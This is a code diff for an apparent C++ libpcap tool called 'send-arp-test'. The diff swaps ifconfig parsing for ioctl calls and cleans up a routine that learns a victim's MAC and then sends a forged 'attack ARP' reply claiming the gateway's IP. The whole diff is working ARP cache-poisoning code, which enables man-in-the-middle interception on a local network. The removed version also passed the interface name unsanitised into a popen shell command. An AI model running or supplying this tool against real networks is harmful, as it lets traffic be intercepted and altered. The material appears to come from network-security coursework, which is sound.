@@ -13,57 +13,40 @@ void usage() {
     printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-std::string getMacAddress(const std::string& interfaceName) {
-    std::string command = "ifconfig " + interfaceName + " 2>/dev/null";
-    FILE* pipe = popen(command.c_str(), "r");
-    if (!pipe) {
-        std::cerr << "Failed to run ifconfig." << std::endl;
-        return "";
-    }
+Mac getMacAddress(const char* iface) {
+    int fd;
+    struct ifreq ifr;
 
-    std::ostringstream output;
-    char buffer[256];
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-        output << buffer;
-    }
-    pclose(pipe);
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
 
-    std::string result = output.str();
-    std::regex macRegex(R"(ether ([0-9a-fA-F:]{17}))");
-    std::smatch match;
-    if (std::regex_search(result, match, macRegex)) {
-        return match[1].str();
-    }
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
 
-    return "";
+    ioctl(fd, SIOCGIFHWADDR, &ifr);
+
+    close(fd);
+
+    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
 }
 
-std::string getIpAddress(const std::string& interfaceName) {
-    std::string command = "ifconfig " + interfaceName + " 2>/dev/null";
-    FILE* pipe = popen(command.c_str(), "r");
-    if (!pipe) {
-        std::cerr << "Failed to run ifconfig." << std::endl;
-        return "";
-    }
+Ip getIpAddress(const char* iface) {
+    int fd;
+    struct ifreq ifr;
 
-    std::ostringstream output;
-    char buffer[256];
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-        output << buffer;
-    }
-    pclose(pipe);
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
 
-    std::string result = output.str();
-    std::regex ipRegex(R"(inet ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+))");
-    std::smatch match;
-    if (std::regex_search(result, match, ipRegex)) {
-        return match[1].str();
-    }
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
 
-    return "";
+    ioctl(fd, SIOCGIFADDR, &ifr);
+
+    close(fd);
+
+    return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
 }
 
-ArpHdr* sendArp(pcap_t* pcap, Mac eth_dmac, Mac eth_smac, Ip sip, Ip dip, Mac arp_smac, Mac arp_dmac){
+
+ArpHdr* sendArp(pcap_t* pcap, Mac eth_smac, Mac eth_dmac, Ip sip, Ip dip, Mac arp_smac, Mac arp_dmac){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = eth_dmac;
@@ -74,7 +57,6 @@ ArpHdr* sendArp(pcap_t* pcap, Mac eth_dmac, Mac eth_smac, Ip sip, Ip dip, Mac ar
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
-
     packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = arp_smac;
     packet.arp_.sip_ = htonl(sip);
@@ -95,10 +77,10 @@ ArpHdr* sendArp(pcap_t* pcap, Mac eth_dmac, Mac eth_smac, Ip sip, Ip dip, Mac ar
             break;
         }
         EthHdr* ethHdr = (struct EthHdr*)reply_packet;
-        if(ethHdr->type() != htons(EthHdr::Arp)) continue;
+        if(ethHdr->type() != EthHdr::Arp) continue;
 
         ArpHdr* arpHdr = (struct ArpHdr*)(reply_packet + sizeof(struct EthHdr));
-        if(arpHdr->sip() == Ip(dip) && arpHdr->op() == htons(ArpHdr::Reply)){
+        if(arpHdr->sip() == Ip(dip) && arpHdr->op() == ArpHdr::Reply){
             return arpHdr;
         }
     }
@@ -112,13 +94,12 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 
-    char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-
     // get my MAC, IP address
-    std::string sdev = argv[1];
-    std::string my_mac = getMacAddress(sdev);
-    std::string my_ip = getIpAddress(sdev);
+    char* dev = argv[1];
+
+    Mac my_mac = getMacAddress(dev);
+    Ip my_ip = getIpAddress(dev);
 
     pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (pcap == nullptr) {
@@ -126,16 +107,17 @@ int main(int argc, char* argv[]) {
         return EXIT_FAILURE;
     }
 
+
     for(int i=2;i<argc;i+=2){
-        std::string sip = argv[i];
-        std::string tip = argv[i+1];
+        Ip sip = Ip(argv[i]);
+        Ip tip = Ip(argv[i+1]);
 
         // get victim's MAC address
-        ArpHdr* arpHdr = sendArp(pcap, Mac(my_mac), Mac::broadcastMac(), Ip(my_ip), Ip(sip), Mac(my_mac), Mac::nullMac());
+        ArpHdr* arpHdr = sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, sip, my_mac, Mac::nullMac());
         Mac smac = arpHdr->smac();
 
         // send attack ARP
-        sendArp(pcap, Mac(my_mac), Mac(smac), Ip(sip), Ip(tip), Mac(my_mac), Mac(smac));
+        sendArp(pcap, my_mac, smac, tip, sip, my_mac, smac);
     }
     pcap_close(pcap);
 
